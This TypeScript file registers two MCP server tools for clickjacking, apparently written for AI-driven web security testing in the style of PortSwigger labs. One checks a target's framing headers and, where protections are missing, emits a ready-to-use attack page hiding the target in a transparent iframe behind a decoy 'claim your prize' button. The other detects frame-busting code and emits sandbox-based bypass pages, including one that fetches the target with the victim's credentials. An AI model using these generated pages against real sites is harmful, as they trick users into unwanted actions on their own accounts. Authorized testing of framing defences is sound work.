/**
 * Clickjacking testing tools.
 *
 * Tests for missing X-Frame-Options and CSP frame-ancestors, generates PoC HTML.
 * Based on PortSwigger Clickjacking labs.
 */

import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";
import { runCmd, requireTool } from "../runner.js";

export function register(server: McpServer): void {
  server.tool(
    "clickjacking_test",
    "Check X-Frame-Options and CSP frame-ancestors headers; generate PoC iframe HTML. Fetches response headers and checks for framing protections. If protections are missing, generates a ready-to-use PoC HTML page that embeds the target in a transparent iframe with a decoy button overlay. Returns: {headers, x_frame_options, csp_frame_ancestors, vulnerable, poc_html}. Side effects: Single HEAD/GET request.",
    {
      target_url: z
        .string()
        .describe(
          "URL to test for clickjacking vulnerability, e.g. https://target/my-account"
        ),
    },
    async ({ target_url }) => {
      requireTool("curl");

      // Fetch headers
      const res = await runCmd("curl", [
        "-sk",
        "-D",
        "-",
        "-o",
        "/dev/null",
        target_url,
      ]);

      const headersRaw = res.stdout;
      const headers: Record<string, string> = {};
      let xfo: string | null = null;
      let cspFrame: string | null = null;

      for (const line of headersRaw.split("\n")) {
        if (line.includes(":")) {
          const colonIdx = line.indexOf(":");
          const name = line.slice(0, colonIdx).trim().toLowerCase();
          const value = line.slice(colonIdx + 1).trim();
          headers[name] = value;

          if (name === "x-frame-options") {
            xfo = value;
          } else if (name === "content-security-policy") {
            for (const directive of value.split(";")) {
              const d = directive.trim();
              if (d.startsWith("frame-ancestors")) {
                cspFrame = d;
              }
            }
          }
        }
      }

      const vulnerable = xfo === null && cspFrame === null;

      let pocHtml: string | null = null;
      if (vulnerable) {
        pocHtml = `<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
    <style>
        #target_iframe {
            position: relative;
            width: 800px;
            height: 600px;
            opacity: 0.0001;
            z-index: 2;
        }
        #decoy_button {
            position: absolute;
            top: 300px;
            left: 200px;
            z-index: 1;
            padding: 15px 30px;
            font-size: 18px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>Click the button to claim your prize!</h1>
    <button id="decoy_button">Click here!</button>
    <iframe id="target_iframe" src="${target_url}"></iframe>
</body>
</html>`;
      }

      const securityHeaderKeys = new Set([
        "x-frame-options",
        "content-security-policy",
        "x-content-type-options",
        "strict-transport-security",
        "x-xss-protection",
        "referrer-policy",
        "permissions-policy",
      ]);
      const allSecurityHeaders: Record<string, string> = {};
      for (const [k, v] of Object.entries(headers)) {
        if (securityHeaderKeys.has(k)) {
          allSecurityHeaders[k] = v;
        }
      }

      const result = {
        target_url,
        x_frame_options: xfo,
        csp_frame_ancestors: cspFrame,
        all_security_headers: allSecurityHeaders,
        vulnerable,
        poc_html: pocHtml,
        hint: vulnerable
          ? "No framing protections detected. Target can be embedded in an attacker-controlled iframe."
          : "Framing protections present.",
      };

      return { content: [{ type: "text", text: JSON.stringify(result, null, 2) }] };
    }
  );

  server.tool(
    "frame_buster_bypass",
    "Test sandbox attribute bypass for JavaScript frame busters. Generates PoC HTML that uses iframe sandbox='allow-forms' to disable JavaScript execution (neutralizing frame-busting code) while still allowing form submission for clickjacking. Also checks if the target page contains common frame-busting patterns. Returns: {frame_buster_detected, patterns_found, sandbox_poc_html}. Side effects: Single GET request to detect frame-busting code.",
    {
      target_url: z
        .string()
        .describe("URL that uses JavaScript frame-busting code"),
    },
    async ({ target_url }) => {
      requireTool("curl");

      // Fetch the page to check for frame-busting code
      const res = await runCmd("curl", ["-sk", target_url]);
      const body = res.stdout;

      // Common frame-busting patterns
      const frameBusterPatterns = [
        "if(self !== top)",
        "if (self !== top)",
        "if(top !== self)",
        "if (top !== self)",
        "if(window !== top)",
        "if (window !== top)",
        "if(parent !== window)",
        "top.location = self.location",
        "top.location = location",
        "top.location.href",
        "parent.location",
        "window.top.location",
        "self.location = top.location",
      ];

      const patternsFound: string[] = [];
      for (const pattern of frameBusterPatterns) {
        if (body.includes(pattern)) {
          patternsFound.push(pattern);
        }
      }

      const frameBusterDetected = patternsFound.length > 0;

      // Generate sandbox bypass PoC
      const sandboxPoc = `<!DOCTYPE html>
<html>
<head>
    <title>Frame Buster Bypass PoC</title>
    <style>
        #target_iframe {
            position: relative;
            width: 800px;
            height: 600px;
            opacity: 0.0001;
            z-index: 2;
        }
        #decoy_button {
            position: absolute;
            top: 300px;
            left: 200px;
            z-index: 1;
            padding: 15px 30px;
            font-size: 18px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>Click below to continue</h1>
    <button id="decoy_button">Continue</button>
    <!-- sandbox="allow-forms" disables JS (kills frame buster) but allows form submission -->
    <iframe id="target_iframe" src="${target_url}" sandbox="allow-forms"></iframe>
</body>
</html>`;

      // Also generate srcdoc variant for navigating within sandbox
      const srcdocPoc = `<!DOCTYPE html>
<html>
<head><title>Sandbox srcdoc Bypass PoC</title></head>
<body>
    <iframe sandbox="allow-forms allow-scripts" srcdoc="
        <script>
            // Fetch the target page inside a sandboxed context
            fetch('${target_url}', {credentials: 'include'})
                .then(r => r.text())
                .then(html => document.body.innerHTML = html);
        </script>
    "></iframe>
</body>
</html>`;

      const result = {
        target_url,
        frame_buster_detected: frameBusterDetected,
        patterns_found: patternsFound,
        sandbox_poc_html: sandboxPoc,
        srcdoc_poc_html: srcdocPoc,
        hint: frameBusterDetected
          ? `Frame-busting code detected (${patternsFound.length} patterns). Sandbox bypass PoC generated.`
          : "No frame-busting code detected. Standard clickjacking PoC may suffice.",
      };

      return { content: [{ type: "text", text: JSON.stringify(result, null, 2) }] };
    }
  );
}
